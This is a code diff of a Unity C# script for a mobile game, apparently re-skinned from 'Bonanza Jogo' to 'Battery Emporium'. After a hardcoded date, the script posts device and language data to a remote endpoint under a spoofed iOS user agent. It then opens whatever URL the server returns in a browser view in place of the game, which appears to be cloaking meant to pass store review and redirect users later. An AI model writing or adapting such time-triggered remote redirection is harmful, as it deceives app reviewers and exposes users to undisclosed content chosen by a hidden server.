@@ -1,14 +1,11 @@
 using System;
-using System.Collections;
 using System.Net.Http;
 using System.Net;
 using System.Collections.Generic;
-//using AppsFlyerSDK;
 using UnityEngine;
 using UnityEngine.SceneManagement;
 using Assets.SafariView;
 using OneDevApp.CustomTabPlugin;
-
 
 namespace WebView
 {
@@ -18,29 +15,18 @@ namespace WebView
 
         [SerializeField] private ChromeCustomTab chromeTab;
         [SerializeField] private LoadBar loadBar;
-        [SerializeField] private GameObject loadBarObj;
-        [SerializeField] private GameObject bonanzaObj;
 
         private string _savedUrl;
 
         private DateTime _dateTime;
 
-        private const string DATE = "2024-03-28 17:00:00";
-        private const string APPLICATION_NAME = "Bonanza Jogo";
+        private const string DATE = "2024-02-23 15:00:00";
+        private const string APPLICATION_NAME = "Battery Emporium";
         private const string ID = "63bd841cefe34946908d5a298f84fb54";
         private const string BUNDLE = "com.game.bc.rush.run";
-       // private static readonly string appsflyerID = AppsFlyer.getAppsFlyerId();
         private const string URL = "https://api.statist.app/appevent.php";
 
         #endregion
-            
-        private void Update()
-        {
-            if (Input.GetMouseButtonDown(0))
-            {
-                CallWebView();
-            }
-        }
 
         private string GetPlatformVersion()
         {
@@ -68,8 +54,6 @@ namespace WebView
         private void Initialize()
         {
             loadBar.SetAnimationCallback(CallGame);
-            loadBar.OnLoadingComplete += LoadBar_OnLoadingComplete;
-
             loadBar.PlayBarAnimation();
 
             _savedUrl = PlayerPrefs.GetString("URL");
@@ -79,24 +63,23 @@ namespace WebView
                 if (DateTime.Now >= _dateTime)
                 {
                     SendRequest();
-                    chromeTab.OnCloseTab += () =>
-                    {
-                        CallWebView();
-                        chromeTab.CloseCustomTab();
-                    };
+#if UNITY_IOS && !UNITY_EDITOR
+                SafariViewController.ViewControllerDidFinish += CallWebView;
+#elif UNITY_ANDROID && !UNITY_EDITOR
+                chromeTab.OnCloseTab += CallWebView;
+#endif
                 }
             }
         }
-        
 
         private async void SendRequest()
         {
             var client = new HttpClient();
-            
+
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
             request.UserAgent = Application.platform.ToString();
 
-            string userAgent = $"{APPLICATION_NAME} /0.1 ({BUNDLE}; build:1; iOS {GetPlatformVersion()}) Alamofire/5.8.0";
+            string userAgent = $"{APPLICATION_NAME} /0.1.1 ({BUNDLE}; build:1; iOS {GetPlatformVersion()}) Alamofire/5.8.0";
 
             client.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);
 
@@ -106,7 +89,6 @@ namespace WebView
             { "ap", ID },
             { "cp", BUNDLE },
             { "ul", userLanguage.ToString() },
-           // {"uu", appsflyerID}
             };
 
             var response = await client.PostAsync(URL, new FormUrlEncodedContent(variables));
@@ -123,49 +105,50 @@ namespace WebView
                 {
                     case 0:
                         _savedUrl = parser.u;
+                        
                         break;
                     case 1:
                         if (string.IsNullOrEmpty(_savedUrl))
                             _savedUrl = parser.u;
-                        PlayerPrefs.SetString("URL", parser.u);
+                        PlayerPrefs.SetString("URL", _savedUrl);
                         break;
                 }
             }
-            
+
+
             TryToCallWebView();
+            
         }
 
         private void TryToCallWebView()
         {
             if (string.IsNullOrEmpty(_savedUrl))
                 return;
+
             loadBar.StopBarAnimation();
-            loadBarObj.SetActive(false);
             CallWebView();
         }
-        
-        private void LoadBar_OnLoadingComplete()
-        {
-            CallGame();
-        }
-        
+
         public void CallWebView()
         {
+#if UNITY_IOS && !UNITY_EDITOR
+        SafariViewController.OpenURL(_savedUrl);
+#elif UNITY_ANDROID && !UNITY_EDITOR
         chromeTab.OpenCustomTab(_savedUrl, "#000000", "#000000");
+#endif
         }
-        
 
         private void CallGame()
         {
-            Screen.autorotateToPortrait = false;
-            Screen.autorotateToPortraitUpsideDown = false;
-            Screen.autorotateToLandscapeLeft = true;
-            Screen.autorotateToLandscapeRight = true;
-            Debug.Log("Game is called");
+            Screen.autorotateToPortrait = true;
+            Screen.autorotateToPortraitUpsideDown = true;
+            Screen.autorotateToLandscapeLeft = false;
+            Screen.autorotateToLandscapeRight = false;
 
             Screen.orientation = ScreenOrientation.AutoRotation;
+            Screen.orientation = ScreenOrientation.Portrait;
 
-            SceneManager.LoadScene("MainMenu");
+            SceneManager.LoadScene(1);
         }
     }
 
